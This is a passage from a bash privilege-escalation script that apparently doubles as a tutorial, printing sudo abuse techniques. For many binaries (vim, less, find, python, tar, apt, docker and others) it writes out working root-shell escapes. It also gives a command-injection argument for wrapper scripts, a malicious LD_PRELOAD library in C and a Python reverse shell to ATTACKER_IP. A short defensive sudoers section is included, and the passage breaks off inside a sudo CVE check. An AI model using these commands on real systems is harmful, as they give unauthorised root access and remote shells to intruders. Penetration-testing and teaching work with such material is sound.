                    teach "  Press: Ctrl+R (Read File)"
                    teach "  Press: Ctrl+X (Execute Command)"
                    teach "  Type: reset; sh 1>&0 2>&0"
                    teach "  Press: Enter"
                    teach ""
                    teach "METHOD 2 - Simpler Variant:"
                    teach "  sudo $bin"
                    teach "  ^R^X"
                    teach "  bash"
                    teach ""
                    teach "WHAT'S HAPPENING:"
                    teach "  Ctrl+R normally reads a file into the buffer"
                    teach "  Ctrl+X executes a command and reads its output"
                    teach "  We execute 'bash' and redirect stdin/stdout/stderr"
                    teach "  Result: Interactive shell as root"
                    ;;
                    
                emacs)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  EMACS EXPLOITATION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "METHODS:"
                    teach "  sudo $bin --eval '(term \"/bin/bash\")'"
                    teach "  # Or interactively:"
                    teach "  sudo $bin"
                    teach "  M-x shell"
                    teach "  # Or:"
                    teach "  M-x term"
                    ;;
                
                # === FILE VIEWERS ===
                less|more)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  LESS/MORE EXPLOITATION - PAGER ESCAPE"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY PAGERS ARE DANGEROUS:"
                    teach "  less/more are pagers (display file content page by page)"
                    teach "  They have a '!' command that executes shell commands"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin /etc/profile"
                    teach "  # Wait for pager to load"
                    teach "  # Type: !sh"
                    teach "  # Press: Enter"
                    teach "  # You now have root shell"
                    teach ""
                    teach "ALTERNATE SYNTAX:"
                    teach "  !bash"
                    teach "  !/bin/bash"
                    teach "  !sh"
                    teach ""
                    teach "WHY IT WORKS:"
                    teach "  The '!' command in less/more spawns a shell"
                    teach "  Since less is running as root (via sudo), the shell is root too"
                    teach ""
                    teach "IF NO SHELL PROMPT APPEARS:"
                    teach "  Type: v"
                    teach "  # This opens vi, then use vim escape methods"
                    ;;
                    
                # === SEARCH UTILITIES ===
                find)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  FIND EXPLOITATION - EXECUTE ARBITRARY COMMANDS"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY FIND IS DANGEROUS:"
                    teach "  The -exec flag allows running commands on found files"
                    teach "  We can abuse this to execute /bin/sh"
                    teach ""
                    teach "METHOD 1 - Direct Shell:"
                    teach "  sudo $bin . -exec /bin/sh \\; -quit"
                    teach ""
                    teach "METHOD 2 - Execute Specific Command:"
                    teach "  sudo $bin . -exec /bin/bash -p \\; -quit"
                    teach ""
                    teach "WHAT'S HAPPENING:"
                    teach "  find .           # Search in current directory"
                    teach "  -exec /bin/sh \\; # Execute shell for each result"
                    teach "  -quit            # Quit after first match (faster)"
                    teach ""
                    teach "WHY \\; IS NEEDED:"
                    teach "  The semicolon ends the -exec command"
                    teach "  Backslash escapes it from the shell"
                    teach ""
                    teach "ALTERNATE EXPLOITATION:"
                    teach "  sudo $bin . -exec chmod u+s /bin/bash \\;"
                    teach "  # Makes bash SUID, then:"
                    teach "  /bin/bash -p"
                    ;;
                    
                # === SCRIPTING LANGUAGES ===
                python*|python)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  PYTHON EXPLOITATION - MULTIPLE VECTORS"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY PYTHON IS EXTREMELY DANGEROUS:"
                    teach "  Python is a full programming language with OS interaction"
                    teach "  Can execute shell commands, manipulate files, spawn processes"
                    teach ""
                    teach "METHOD 1 - Direct Shell Spawn:"
                    teach "  sudo $bin -c 'import os; os.system(\"/bin/bash\")'"
                    teach ""
                    teach "METHOD 2 - Using execl (cleaner):"
                    teach "  sudo $bin -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'"
                    teach ""
                    teach "METHOD 3 - Using subprocess:"
                    teach "  sudo $bin -c 'import subprocess; subprocess.call([\"/bin/bash\"])'"
                    teach ""
                    teach "METHOD 4 - PTY Shell (Interactive):"
                    teach "  sudo $bin -c 'import pty; pty.spawn(\"/bin/bash\")'"
                    teach ""
                    teach "METHOD 5 - Reading Sensitive Files:"
                    teach "  sudo $bin -c 'print(open(\"/etc/shadow\").read())'"
                    teach ""
                    teach "METHOD 6 - Writing Files:"
                    teach "  sudo $bin -c 'open(\"/etc/sudoers\",\"a\").write(\"user ALL=(ALL) NOPASSWD: ALL\")'"
                    teach ""
                    teach "FOR PERSISTENCE - Create SUID Bash:"
                    teach "  sudo $bin -c 'import os; os.chmod(\"/bin/bash\", 0o4755)'"
                    teach "  /bin/bash -p"
                    ;;
                    
                perl)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  PERL EXPLOITATION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "METHOD 1 - exec (replaces current process):"
                    teach "  sudo $bin -e 'exec \"/bin/bash\";'"
                    teach ""
                    teach "METHOD 2 - system (spawns subprocess):"
                    teach "  sudo $bin -e 'system(\"/bin/bash\");'"
                    teach ""
                    teach "METHOD 3 - Using POSIX setuid:"
                    teach "  sudo $bin -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'"
                    ;;
                    
                ruby)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  RUBY EXPLOITATION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "METHOD 1 - exec:"
                    teach "  sudo $bin -e 'exec \"/bin/bash\"'"
                    teach ""
                    teach "METHOD 2 - system:"
                    teach "  sudo $bin -e 'system(\"/bin/bash\")'"
                    teach ""
                    teach "METHOD 3 - With setuid:"
                    teach "  sudo $bin -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'"
                    ;;
                    
                node|nodejs)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  NODE.JS EXPLOITATION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "METHOD 1 - child_process.spawn:"
                    teach "  sudo $bin -e 'require(\"child_process\").spawn(\"/bin/bash\", {\""
                    teach "    stdio: [0,1,2]})'"
                    teach ""
                    teach "METHOD 2 - child_process.exec:"
                    teach "  sudo $bin -e 'require(\"child_process\").exec(\"/bin/bash\")'"
                    ;;
                
                # === SHELLS ===
                bash|sh|zsh|dash)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  SHELL BINARY - DIRECT ACCESS"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "This is the simplest case - direct shell access."
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin"
                    teach ""
                    teach "IF BASH, PRESERVE PRIVILEGES:"
                    teach "  sudo $bin -p"
                    teach ""
                    teach "WHY -p FLAG:"
                    teach "  Bash drops privileges if EUID ≠ UID"
                    teach "  -p flag preserves the effective UID"
                    ;;
                    
                # === UTILITIES ===
                env)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  ENV EXPLOITATION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHAT ENV DOES:"
                    teach "  Runs a program in a modified environment"
                    teach "  Can be used to execute any binary"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin /bin/sh"
                    teach "  sudo $bin /bin/bash"
                    ;;
                    
                awk|gawk|nawk|mawk)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  AWK EXPLOITATION - TEXT PROCESSING TO SHELL"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY AWK IS DANGEROUS:"
                    teach "  AWK is a text processing language with system() function"
                    teach "  BEGIN block executes before processing any input"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin 'BEGIN {system(\"/bin/bash\")}'"
                    teach ""
                    teach "ALTERNATE:"
                    teach "  sudo $bin 'BEGIN {system(\"/bin/sh\")}'"
                    ;;
                    
                sed)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  SED EXPLOITATION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "METHOD 1 - Execute command:"
                    teach "  sudo $bin -n '1e exec /bin/sh' /etc/hosts"
                    teach ""
                    teach "METHOD 2 - Using GNU sed e flag:"
                    teach "  echo | sudo $bin '1e /bin/sh'"
                    ;;
                    
                systemctl)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  SYSTEMCTL EXPLOITATION - PAGER ESCAPE"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY SYSTEMCTL IS EXPLOITABLE:"
                    teach "  When showing long output, systemctl uses a pager (usually less)"
                    teach "  We can escape from the pager to get a shell"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin status trail.service"
                    teach "  # Or any service with long output"
                    teach "  # Wait for pager to appear"
                    teach "  # Type: !sh"
                    teach "  # Press Enter"
                    teach ""
                    teach "IF THAT DOESN'T WORK:"
                    teach "  Set pager before running:"
                    teach "  export PAGER='/bin/bash -c \"/bin/bash\"'"
                    teach "  sudo $bin status any.service"
                    ;;
                    
                git)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  GIT EXPLOITATION - PAGER ESCAPE"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin help status"
                    teach "  # Wait for pager"
                    teach "  # Type: !sh"
                    teach ""
                    teach "ALTERNATE - Set pager:"
                    teach "  sudo $bin -c 'core.pager=/bin/sh' config"
                    teach "  sudo $bin log"
                    ;;
                    
                tar)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  TAR EXPLOITATION - CHECKPOINT ACTION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY TAR IS DANGEROUS:"
                    teach "  tar has a --checkpoint-action flag that executes commands"
                    teach "  Intended for progress monitoring, but can run anything"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin -cf /dev/null /dev/null --checkpoint=1 \\"
                    teach "    --checkpoint-action=exec=/bin/sh"
                    teach ""
                    teach "WHAT'S HAPPENING:"
                    teach "  -cf /dev/null    # Create archive to /dev/null"
                    teach "  /dev/null        # Archive this file"
                    teach "  --checkpoint=1   # Run action at checkpoint 1"
                    teach "  --checkpoint-action=exec=/bin/sh  # Execute shell"
                    ;;
                    
                zip)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  ZIP EXPLOITATION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin /tmp/x.zip /etc/hosts -T -TT 'sh #'"
                    teach ""
                    teach "WHAT'S HAPPENING:"
                    teach "  -T  # Test integrity"
                    teach "  -TT # Test extra integrity (runs command)"
                    ;;
                    
                make)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  MAKE EXPLOITATION - MAKEFILE EXECUTION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin -s --eval=\$'x:\\n\\t-/bin/bash -p'"
                    teach ""
                    teach "ALTERNATE - If you can write Makefile:"
                    teach "  echo 'x:' > /tmp/Makefile"
                    teach "  echo -e '\\t/bin/bash -p' >> /tmp/Makefile"
                    teach "  cd /tmp && sudo $bin"
                    ;;
                    
                apt|apt-get)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  APT/APT-GET EXPLOITATION - PRE-INVOKE HOOKS"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY APT IS DANGEROUS:"
                    teach "  APT can run commands before/after package operations"
                    teach "  These hooks (Pre-Invoke) execute as root"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin update -o APT::Update::Pre-Invoke::=/bin/sh"
                    teach ""
                    teach "ALTERNATE - Config file method:"
                    teach "  echo 'APT::Update::Pre-Invoke {\"/bin/bash -i\"};' > /tmp/pwn"
                    teach "  sudo $bin update -c /tmp/pwn"
                    ;;
                    
                yum)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  YUM EXPLOITATION - PLUGIN LOADING"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  TF=\$(mktemp -d)"
                    teach "  cat > \$TF/x.py << 'EOF'"
                    teach "  import os"
                    teach "  import yum"
                    teach "  from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE"
                    teach "  requires_api_version='2.1'"
                    teach "  def init_hook(conduit):"
                    teach "      os.execl('/bin/bash','bash')"
                    teach "  EOF"
                    teach "  sudo $bin -c \"pluginpath=\$TF\" --plugins list"
                    ;;
                    
                docker)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  DOCKER EXPLOITATION - CONTAINER MOUNT"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY DOCKER SUDO IS CRITICAL:"
                    teach "  Docker daemon runs as root"
                    teach "  Can mount host filesystem inside containers"
                    teach "  Container root = host root (by default)"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
                    teach ""
                    teach "WHAT'S HAPPENING:"
                    teach "  -v /:/mnt        # Mount host root to /mnt in container"
                    teach "  --rm             # Remove container after exit"
                    teach "  -it              # Interactive terminal"
                    teach "  alpine           # Lightweight image"
                    teach "  chroot /mnt      # Change root to mounted host filesystem"
                    teach "  /bin/bash        # Spawn shell"
                    teach ""
                    teach "RESULT:"
                    teach "  You're now root on the HOST system, not in a container"
                    ;;
                    
                *)
                    warn "Binary: $basename"
                    teach "→ Not in our database. Check GTFOBins:"
                    teach "  https://gtfobins.github.io/#$basename"
                    teach ""
                    teach "GENERAL EXPLOITATION APPROACH:"
                    teach "  1. Does it spawn a shell? (bash, sh, exec)"
                    teach "  2. Can it execute commands? (system(), exec(), etc.)"
                    teach "  3. Does it have a pager? (!, :!sh)"
                    teach "  4. Can it write files? (may allow /etc/sudoers modification)"
                    teach "  5. Does it call other programs? (PATH hijacking potential)"
                    ;;
            esac
            log ""
        done
    fi
    
    # Finding 3: Wildcard injection opportunities
    if [ $found_wildcards -eq 1 ]; then
        critical "WILDCARD IN SUDO COMMANDS - Argument injection possible"
        log ""
        teach "╔════════════════════════════════════════════════════════════════╗"
        teach "║  WILDCARD INJECTION - ADVANCED EXPLOITATION"
        teach "╚════════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT WILDCARDS MEAN:"
        teach "  Admins sometimes use wildcards in sudoers to allow flexibility:"
        teach "  Example: alice ALL=(ALL) NOPASSWD: /usr/bin/systemctl * apache2"
        teach ""
        teach "THE VULNERABILITY:"
        teach "  Wildcards match ANY text, including additional arguments"
        teach "  You can inject malicious arguments that change command behavior"
        teach ""
        teach "EXAMPLE SCENARIO:"
        teach "  Sudoers entry:"
        teach "  bob ALL=(ALL) NOPASSWD: /usr/bin/systemctl * apache2"
        teach ""
        teach "  Admin intention:"
        teach "    sudo systemctl restart apache2"
        teach "    sudo systemctl stop apache2"
        teach ""
        teach "  Exploitation:"
        teach "    sudo systemctl status apache2"
        teach "    # Wait for pager, then: !sh"
        teach ""
        teach "WHY IT WORKS:"
        teach "  'systemctl status apache2' matches the pattern"
        teach "  'status' matches the wildcard"
        teach "  systemctl shows output in pager → pager escape"
        teach ""
        
        while IFS= read -r line; do
            vuln "Wildcard entry: $line"
            
            # Analyze what can be done
            if echo "$line" | grep -qi "systemctl"; then
                teach "→ systemctl wildcard detected"
                teach "  Try: sudo systemctl status <service> → !sh"
            fi
            
            if echo "$line" | grep -qi "find"; then
                teach "→ find wildcard detected"
                teach "  Inject -exec: sudo find <matching_pattern> . -exec /bin/sh \\;"
            fi
            
            if echo "$line" | grep -qi "vim\|vi\|nano\|emacs"; then
                teach "→ Editor with wildcard"
                teach "  Any file access → shell escape from editor"
            fi
        done < "$temp_wildcards"
        log ""
    fi
    
    # Finding 4: Relative paths (PATH hijacking)
    if [ $found_relative_paths -eq 1 ]; then
        critical "RELATIVE PATHS IN SUDO - PATH hijacking possible"
        log ""
        teach "╔════════════════════════════════════════════════════════════════╗"
        teach "║  PATH HIJACKING - SUDO EDITION"
        teach "╚════════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT RELATIVE PATHS MEAN:"
        teach "  Absolute path: /usr/bin/python (starts with /)"
        teach "  Relative path: python (no leading /)"
        teach ""
        teach "THE VULNERABILITY:"
        teach "  When sudo runs a relative path command, it searches \$PATH"
        teach "  If you control a directory early in PATH, you control what executes"
        teach ""
        teach "WHY THIS HAPPENS:"
        teach "  Admin writes in sudoers: alice ALL=(ALL) NOPASSWD: python /scripts/backup.py"
        teach "  Thinks: 'python will be /usr/bin/python'"
        teach "  Reality: 'python' searches PATH directories in order"
        teach ""
        teach "EXPLOITATION STEPS:"
        teach ""
        teach "  1. Check current PATH:"
        teach "     echo \$PATH"
        teach ""
        teach "  2. Find writable directory in PATH:"
        teach "     # Often /usr/local/bin or /tmp if misconfigured"
        teach ""
        teach "  3. Create malicious binary in that directory:"
        
        while IFS='|' read -r line cmd; do
            [ -z "$cmd" ] && continue
            vuln "Relative path: $cmd"
            teach ""
            teach "  Create fake $cmd:"
            teach "  cat > /tmp/$cmd << 'EOF'"
            teach "  #!/bin/bash"
            teach "  /bin/bash -p"
            teach "  EOF"
            teach "  chmod +x /tmp/$cmd"
            teach ""
            teach "  4. Modify PATH (if possible):"
            teach "     export PATH=/tmp:\$PATH"
            teach ""
            teach "  5. Run sudo command:"
            teach "     sudo $cmd ..."
            teach "     # Executes YOUR binary as root"
        done < "$temp_relative"
        log ""
    fi
    
    # Finding 5: Shell wrapper scripts
    if [ $found_shell_wrappers -eq 1 ]; then
        warn "SHELL WRAPPER SCRIPTS IN SUDO - Analyze for command injection"
        log ""
        teach "╔════════════════════════════════════════════════════════════════╗"
        teach "║  SHELL WRAPPER EXPLOITATION"
        teach "╚════════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT ARE WRAPPER SCRIPTS:"
        teach "  Shell scripts that wrap other commands"
        teach "  Often added to sudoers instead of the actual binary"
        teach ""
        teach "COMMON VULNERABILITIES:"
        teach "  1. Command injection via arguments"
        teach "  2. Unquoted variables"
        teach "  3. Unsafe use of user input"
        teach "  4. Calls to other programs without full paths"
        teach ""
        
        while IFS='|' read -r line script; do
            [ -z "$script" ] && continue
            vuln "Wrapper script: $script"
            
            if [ -r "$script" ]; then
                teach ""
                teach "Analyzing $script for vulnerabilities..."
                
                # Check for command injection patterns
                if grep -E '\$[1-9@*]|\${.*}' "$script" | grep -v '^#' | grep -q .; then
                    critical "  Script uses user input/arguments!"
                    teach "  Found user input usage:"
                    grep -E '\$[1-9@*]|\${.*}' "$script" | grep -v '^#' | head -3 | while read found; do
                        teach "    $found"
                    done
                fi
                
                # Check for unquoted variables
                if grep -E '\$[A-Za-z_][A-Za-z0-9_]*[^"]' "$script" | grep -v '^#' | grep -q .; then
                    warn "  Potentially unquoted variables detected"
                fi
                
                # Check for calls without absolute paths
                if grep -vE '^#|^[[:space:]]*#' "$script" | grep -E '^[[:space:]]*(system|exec|eval|source|\.)' | grep -q .; then
                    warn "  Script calls other programs - check for PATH exploitation"
                fi
                
                teach ""
                teach "EXPLOITATION APPROACHES:"
                teach "  1. If script uses arguments unsafely:"
                teach "     sudo $script '; /bin/bash #'"
                teach "     sudo $script '\$(whoami)'"
                teach ""
                teach "  2. If script calls other binaries:"
                teach "     - Check if PATH can be modified"
                teach "     - Create malicious binary with same name"
                teach ""
                teach "  3. Manual analysis:"
                teach "     cat $script"
                teach "     Look for: eval, system(), exec, unquoted \$variables"
            else
                warn "  Cannot read script - manual analysis required"
            fi
        done < "$temp_wrappers"
        log ""
    fi
    
    # Finding 6: SETENV tag
    if [ $has_setenv -eq 1 ]; then
        critical "SETENV TAG DETECTED - Can modify environment variables"
        log ""
        teach "╔════════════════════════════════════════════════════════════════╗"
        teach "║  SETENV - ENVIRONMENT VARIABLE CONTROL"
        teach "╚════════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT SETENV DOES:"
        teach "  Allows setting arbitrary environment variables when using sudo"
        teach "  Normally sudo sanitizes environment for security"
        teach "  SETENV disables this protection"
        teach ""
        teach "WHY IT'S DANGEROUS:"
        teach "  Many programs rely on environment variables"
        teach "  Attackers can hijack behavior by setting:"
        teach "  • LD_PRELOAD (load malicious library)"
        teach "  • LD_LIBRARY_PATH (override library location)"
        teach "  • PATH (hijack command resolution)"
        teach "  • PYTHONPATH (inject malicious Python modules)"
        teach ""
        teach "EXPLOITATION:"
        teach "  sudo ARBITRARY_VAR=value <allowed_command>"
        teach ""
        teach "SPECIFIC ATTACKS:"
        teach ""
        teach "  1. LD_PRELOAD (if program uses dynamic libraries):"
        teach "     Create evil.c:"
        teach "     #include <stdio.h>"
        teach "     #include <sys/types.h>"
        teach "     #include <stdlib.h>"
        teach "     void _init() {"
        teach "         unsetenv(\"LD_PRELOAD\");"
        teach "         setgid(0); setuid(0);"
        teach "         system(\"/bin/bash -p\");"
        teach "     }"
        teach ""
        teach "     Compile:"
        teach "     gcc -shared -fPIC -o /tmp/evil.so evil.c"
        teach ""
        teach "     Execute:"
        teach "     sudo LD_PRELOAD=/tmp/evil.so <allowed_command>"
        teach ""
        teach "  2. If Python script:"
        teach "     mkdir /tmp/modules"
        teach "     cat > /tmp/modules/os.py << 'EOF'"
        teach "     import socket,subprocess"
        teach "     s=socket.socket()"
        teach "     s.connect((\"ATTACKER_IP\",4444))"
        teach "     subprocess.call([\"/bin/bash\"],stdin=s.fileno(),"
        teach "       stdout=s.fileno(),stderr=s.fileno())"
        teach "     EOF"
        teach ""
        teach "     sudo PYTHONPATH=/tmp/modules <python_script>"
        log ""
    fi
    
    # Finding 7: env_keep with LD_PRELOAD
    if [ $has_ld_preload -eq 1 ]; then
        critical "LD_PRELOAD PRESERVED - Library injection attack"
        log ""
        teach "╔════════════════════════════════════════════════════════════════╗"
        teach "║  LD_PRELOAD EXPLOITATION - IN DEPTH"
        teach "╚════════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT IS LD_PRELOAD:"
        teach "  Environment variable that forces dynamic linker to load"
        teach "  specified libraries BEFORE all others"
        teach ""
        teach "HOW PROGRAMS LOAD LIBRARIES:"
        teach "  1. Program starts"
        teach "  2. Dynamic linker (ld.so) loads shared libraries"
        teach "  3. If LD_PRELOAD is set, loads those libraries first"
        teach "  4. Any functions in preloaded library override system libraries"
        teach ""
        teach "THE ATTACK:"
        teach "  We create a malicious library with an _init() function"
        teach "  _init() runs automatically when library loads"
        teach "  Our code executes before main program even starts"
        teach "  Since sudo runs as root, our code runs as root"
        teach ""
        teach "COMPLETE EXPLOITATION:"
        teach ""
        teach "  Step 1: Create malicious library (evil.c):"
        teach "  cat > /tmp/evil.c << 'EOF'"
        teach "  #include <stdio.h>"
        teach "  #include <sys/types.h>"
        teach "  #include <stdlib.h>"
        teach ""
        teach "  void _init() {"
        teach "      // Unset LD_PRELOAD to avoid issues"
        teach "      unsetenv(\"LD_PRELOAD\");"
        teach "      "
        teach "      // Set real and effective UID to 0 (root)"
        teach "      setgid(0);"
        teach "      setuid(0);"
        teach "      "
        teach "      // Spawn root shell"
        teach "      system(\"/bin/bash -p\");"
        teach "  }"
        teach "  EOF"
        teach ""
        teach "  Step 2: Compile as shared library:"
        teach "  gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c -nostartfiles"
        teach ""
        teach "  Flags explanation:"
        teach "  -shared       : Create shared library (.so)"
        teach "  -fPIC         : Position Independent Code (required for .so)"
        teach "  -nostartfiles : Don't use standard startup files"
        teach ""
        teach "  Step 3: Execute with ANY sudo-allowed command:"
        teach "  sudo LD_PRELOAD=/tmp/evil.so <any_allowed_command>"
        teach ""
        teach "  Example commands that work:"
        teach "  sudo LD_PRELOAD=/tmp/evil.so find /etc -name passwd"
        teach "  sudo LD_PRELOAD=/tmp/evil.so apache2ctl restart"
        teach "  sudo LD_PRELOAD=/tmp/evil.so cat /etc/issue"
        teach ""
        teach "WHY THIS WORKS:"
        teach "  The command doesn't matter - it never actually runs"
        teach "  Our _init() executes during library loading"
        teach "  We spawn bash and the original command never executes"
        teach ""
        teach "REQUIREMENTS:"
        teach "  • gcc must be available (or compile elsewhere)"
        teach "  • At least ONE sudo command allowed"
        teach "  • That command must use shared libraries (most do)"
        log ""
    fi
    
    # Finding 8: env_keep with LD_LIBRARY_PATH
    if [ $has_ld_library_path -eq 1 ]; then
        warn "LD_LIBRARY_PATH PRESERVED - Library path hijacking"
        log ""
        teach "LD_LIBRARY_PATH allows specifying directories to search for libraries"
        teach "Similar to LD_PRELOAD but requires matching library names"
        teach ""
        teach "EXPLOITATION:"
        teach "  1. Find which libraries the sudo program uses:"
        teach "     ldd <sudo_allowed_command>"
        teach "  2. Create malicious version of one library"
        teach "  3. Place in writable directory"
        teach "  4. Run: sudo LD_LIBRARY_PATH=/your/dir <command>"
        log ""
    fi
    
    # === PHASE 4: GENERAL SUDO EDUCATION (ALWAYS SHOW) ===
    log ""
    teach "╔════════════════════════════════════════════════════════════════╗"
    teach "║  SUDO SECURITY - KEY TAKEAWAYS"
    teach "╚════════════════════════════════════════════════════════════════╝"
    teach ""
    teach "MENTAL MODEL FOR SUDO EXPLOITATION:"
    teach ""
    teach "  When you see a sudo entry, ask these questions:"
    teach ""
    teach "  1. WHAT can I run?"
    teach "     → Specific binary or wildcard?"
    teach ""
    teach "  2. HOW is it specified?"
    teach "     → Absolute path (/usr/bin/vim) or relative (vim)?"
    teach ""
    teach "  3. CAN it spawn a shell?"
    teach "     → Editors, pagers, interpreters = YES"
    teach ""
    teach "  4. DOES it process my input?"
    teach "     → Arguments, environment variables, files?"
    teach ""
    teach "  5. WHAT environment is preserved?"
    teach "     → LD_PRELOAD, PATH, PYTHONPATH?"
    teach ""
    teach "EXPLOITATION PRIORITY:"
    teach "  1. (ALL:ALL) NOPASSWD: ALL → sudo /bin/bash (instant)"
    teach "  2. NOPASSWD with shell (bash, sh, zsh) → sudo bash (instant)"
    teach "  3. NOPASSWD with editor (vim, nano) → shell escape"
    teach "  4. NOPASSWD with interpreter (python, perl) → spawn shell"
    teach "  5. LD_PRELOAD preserved → library injection"
    teach "  6. Wildcards in commands → argument injection"
    teach "  7. Relative paths → PATH hijacking"
    teach "  8. Shell scripts → command injection"
    teach ""
    teach "COMMON GTFOBINS PATTERNS:"
    teach "  • Editors: :!/bin/bash or :shell"
    teach "  • Pagers: !sh or !bash"
    teach "  • Interpreters: -c 'import os; os.system(\"/bin/bash\")'"
    teach "  • Find utilities: -exec /bin/bash \\;"
    teach "  • Package managers: Pre/Post-invoke hooks"
    teach ""
    teach "DEFENSE (from admin perspective):"
    teach "  ✗ DON'T: alice ALL=(ALL) NOPASSWD: ALL"
    teach "  ✗ DON'T: bob ALL=(ALL) /usr/bin/*"
    teach "  ✗ DON'T: charlie ALL=(ALL) vim"
    teach ""
    teach "  ✓ DO: david ALL=(ALL) /usr/bin/systemctl restart apache2"
    teach "  ✓ DO: Use argument restrictions (sudoedit instead of vim)"
    teach "  ✓ DO: Require passwords (avoid NOPASSWD)"
    teach "  ✓ DO: Use absolute paths only"
    teach "  ✓ DO: Minimize sudo access"
    teach ""
    teach "REMEMBER:"
    teach "  Every sudo entry is a potential privilege escalation"
    teach "  Check GTFOBins for EVERY binary you have sudo access to"
    teach "  Even 'harmless' utilities often have shell escapes"
    teach "  Environmental control (LD_PRELOAD, SETENV) = game over"
    log ""
    
    # === PHASE 5: DISPLAY FULL SUDO OUTPUT ===
    if [ $has_sudo -eq 1 ]; then
        info "Your complete sudo permissions:"
        echo "$sudo_output" | while read line; do
            log "  $line"
        done
        log ""
        
        if [ -n "$sudo_version" ]; then
            info "Sudo version: $sudo_version"
            teach "Check enum_sudo_version for version-specific CVEs"
        fi
    fi
}
# === SUDO VERSION ANALYSIS ===
enum_sudo_version() {
    section "SUDO VERSION ANALYSIS"
    
    explain_concept "Sudo Vulnerabilities" \
        "Sudo is complex software with a history of privilege escalation bugs. Version-specific CVEs can give instant root." \
        "Sudo handles authentication, environment sanitization, and privilege transitions. It's over 30 years old with hundreds of thousands of lines of code. Bugs in parsing, memory management, or logic = root access. Sudo runs as root and processes untrusted user input - a perfect target for exploitation." \
        "Why sudo has vulnerabilities:\n  • Complex codebase (authentication, parsing, environment handling)\n  • Runs as root by design\n  • Processes user-controlled input\n  • Backward compatibility constraints\n  • Memory-unsafe language (C)\n\nCheck version: sudo -V | head -1"
    
    if command -v sudo >/dev/null 2>&1; then
        local sudo_version=$(sudo -V 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+[a-z]?[0-9]*')
        info "Sudo version: $sudo_version"
        
        if [ -z "$sudo_version" ]; then
            warn "Could not determine sudo version"
            return
        fi
        
        # Parse version - handle formats like 1.9.15p5
        local version_num=$(echo "$sudo_version" | sed 's/p.*//')
        local major=$(echo "$version_num" | cut -d. -f1)
        local minor=$(echo "$version_num" | cut -d. -f2)
        local patch=$(echo "$version_num" | cut -d. -f3)
        local p_version=$(echo "$sudo_version" | grep -oE 'p[0-9]+' | sed 's/p//')
        
        log ""
        info "Checking against known sudo CVEs..."
        log ""
        
        # CVE-2025-32463 (January 2025)
        if [ "$major" -eq 1 ] && [ "$minor" -eq 9 ]; then
            if [ "$patch" -lt 16 ] || ([ "$patch" -eq 16 ] && [ -n "$p_version" ] && [ "$p_version" -lt 1 ]); then
